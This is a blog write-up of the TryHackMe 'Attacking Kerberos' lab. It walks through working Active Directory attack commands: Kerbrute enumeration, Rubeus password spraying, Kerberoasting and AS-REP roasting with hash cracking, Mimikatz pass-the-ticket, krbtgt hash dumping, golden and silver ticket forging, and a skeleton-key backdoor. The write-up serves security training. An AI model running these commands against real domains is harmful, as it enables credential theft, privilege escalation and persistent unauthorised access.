---
title: THM Attacking Kerberos Writeup
date: 2022-08-30 12:00:00 -0700
categories: [tryhackme,ctf]
tags: [thm,ctf,writeup,hacking] # TAG names should always be lowercase
---

# Attacking Kerberos
---
![](/assets/images/thm/kerberos/first-image.png)

Welcome to my THM Attacking Kerberos writeup. I will only be covering the more technical aspects of the room instead of the reading definition or reading based questions. If you need any help with this you've come to the right place! Please follow along!

## Task 2
---
This task starts off with a bit more setup by adding the domain+IP of the machine to your /etc/hosts file for following the commands for the rest of the room. you can add this manually through your text editor or from terminal via: ( $IP is the environment variable I set for every machine as to not have to remember and consistently copy/paste when needed )

To set the environment variable.
```bash
set IP=<thm-machine-ip>
```

Add machine to your /etc/hosts.
```bash
echo $IP contrller.local >> /etc/hosts
```

Now we will need to pull down the Username and Password files provided for the room.
```bash
git clone https://github.com/Cryilllic/Active-Directory-Wordlists
```

Now we get to the main part of this task. Here we will start our user enumeration on kerberos via kerbrute. ( all following commands will be run in the same directory we downloaded the wordlists )
```bash
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local Active-Directory-Wordlists/User.txt
```

Once ran we should see the following output.
![](/assets/images/thm/kerberos/kerbrute1.png)
![](/assets/images/thm/kerberos/kerbrute2.png)

From this output you will be able to answer the questions for the task.


## Task 3
---
For this task we will need to have remote access to the machine. This can be achieved via SSH or RDP. For this guide I will be using remmina to RDP into the machine.

Open remmina and click the new connection icon.
![](/assets/images/thm/kerberos/remmina1.png)

Next change the protocol to RDP and add all required credentials and connect.
![](/assets/images/thm/kerberos/remmina2.png)
once connected open a command prompt, navigate to the Downloads directory, and run this command: ( This command runs rubeus and calls the harvest command. this collects the tickets being sent to the KDC or Key distribution center, and checks every 30 seconds)
```shell
Rubeus.exe harvest /interval:30
```

You should see the output bellow.
![](/assets/images/thm/kerberos/rubeus1.png)
![](/assets/images/thm/kerberos/rubeus2.png)

With this output you will be able to answer the task questions however please continue with the task instructions to learn password spraying via rubeus.

Before attempting the password spraying we will need to add the machine to the windows hosts file.
``` shell
echo $IP CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

Once added we can begin the attack.
The following command calls the brute function to start a brute force attack, and passes the password variable along with the noticket option to spray the given password to all available tickets to see if their is a match. 
```shell
Rubeus.exe brute /password:Password1 /noticket
```

You should see the output bellow.
![](/assets/images/thm/kerberos/rubeus3.png)

Here you see that the user **Machine1** has a password of **Password1**



## Task 4
---
As stated in the task "Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account"

Lets start the roast!

Again we start with rubeus and of course to start the roast we call kerberoast.
```shell
Rubeus.exe kerberoast
```

Once done you should see the following output.
![](/assets/images/thm/kerberos/kerberoast1.png)
![](/assets/images/thm/kerberos/kerberoast2.png)

now copy and paste the hashes provided onto your attack machine and crack the hash.
for this room we use hashcat however john the ripper works just as well. do this for both hashes.
```bash
hashcat -m 13100 -a 0 hash.txt Active-Directory-Wordlists/Pass.txt`
```

Once cracked you should have the passwords here:
**MYPassword123#**
**Summer2020**

**If you get no output try the following command to check cracked hashes ( change the hash.txt to each hash file you have to show )**
```bash
hashcat --show hash.txt
```

To do the same thing but remotely without needing rubeus installed on the target we can use this impacket python script to achieve the answers
```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.205.63 -request
```


## Task 5
---
For this task we will be attacking in another popular method as-rep roasting. As discussed in the task " AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled." to exploit this we must do the following:

Execute this on the target machine. same as kerberoasting.
```shell
Rubeus.exe asreproast
```

You should get this output
![](/assets/images/thm/kerberos/asreproast.png)

In the task it says to insert a 23 after the kerb5asrep in the hash however you can still retrieve the password without this step.
Now same as the last task crack those hashes!
```bash
hashcat -m 18200 hash.txt Active-Directory-Wordlists/Pass.txt
```

you can also use john
```bash
john --format=krb5asrep --wordlist=Active-Directory-Wordlists/Pass.txt hash.txt
```

**Again if you error out you can run the --show option for both cracking tools to see the password**

```bash
john --show hash.txt
```

```bash
hashcat --show hash.txt
```


## Task 6
---
Now we will start exploring the use of Mimikatz. 
first things first ensure you have proper permissions to run mimikatz

do so by entering 

```shell
privilege::debug
```

you should see the following output.

![](/assets/images/thm/kerberos/mimikatz-priv.png)

one thing we can do is grab all available client tickets on the machine.

```shell
sekurlsa::tickets /export
```

You will see a lot of output like the following. This command just grabbed all the available tickets and placed them within your working directory. In this case, Downloads.

![](/assets/images/thm/kerberos/mimikatz-tickets1.png)

You can see this in file explorer here

![](/assets/images/thm/kerberos/mimikatz-tickets2.png)

now to  "login" as one of these users using the following command.

```shell
kerberos::ptt [0;77e19]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL
```

You should receive this output.

![](/assets/images/thm/kerberos/mimikatz-tickets3.png)

To see if we are now accessing the other account you will want to exit mimikatz and run

```shell
klist
```

Here you will see the client is now showing as Admin

![](/assets/images/thm/kerberos/mimikatz-tickets4.png)

You have successfully passed the hash!!


## Task 7
---

Here we will be discussing how to make a silver ticket. As stated in the task, "KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the KRBTGT you give yourself the ability to create a service ticket for anything you want."

To start this off we will need to start off the same way as we did in the other mimikatz tasks.

```shell
mimikatz.exe 
```

and

```shell
privilege::debug
```

Then we will run 

```shell
lsadump::lsa /inject /name:krbtgt
```

As stated in the task, "This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account."

Example output below

![](/assets/images/thm/kerberos/mimikatz1.png)
![](/assets/images/thm/kerberos/mimikatz2.png)

As the task said "This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103."

golden

```shell
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:<NTLM HASH> /id:500
```

silver

```shell
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt:<NTLM HASH> /id:1103
```

![](/assets/images/thm/kerberos/mimikatz3.png)

This will spawn a new command prompt with the privileges of the new ticket

```shell
misc::cmd
```


Do the first step we did to dump the NTLM hash but change the name to Administrator

```shell
lsadump::lsa /inject /name:Administrator
```

The output will provide your answer for the task.

![](/assets/images/thm/kerberos/mimikatz-admin.png)

Same here but name = sqlservice

```shell
lsadump::lsa /inject /name:sqlservice
```

The output will provide your answer for the task.

![](/assets/images/thm/kerberos/mimikatz-sql.png)


## Task 8
---

Here we will be using a kerberos backdoor from mimikatz called a skeleton key.
As discussed in the task " A Kerberos backdoor acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password." once mimikatz is installed on the target it is rather simple to use.

simply follow these commands

To start Mimikatz

```shell
mimikatz.exe
```

To check if your privilege is ok

```shell
privilege::debug
```

![](/assets/images/thm/kerberos/mimikatz-priv.png)

To get your skeleton key

```shell
misc::skeleton
```

![](/assets/images/thm/kerberos/mimikatz-skel.png)

now you will be able to access nearly anything you need or require. As stated in the task 'The default hash for a mimikatz skeleton key is _60BA4FCADC466C7A033C178194C03DF6_ which makes the password -"_mimikatz_" '

for example to access the admin share you could use this command.

```shell
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
```

to access directories you could use a command similar to:

```shell
dir \\Desktop-1\c$ /user:Machine1 mimikatz
```


## Conclusion
---
And we are done! 
Over all I enjoyed this room and it was amazingly informative in these basic techniques on attacking kerberos.
Thank you for reading!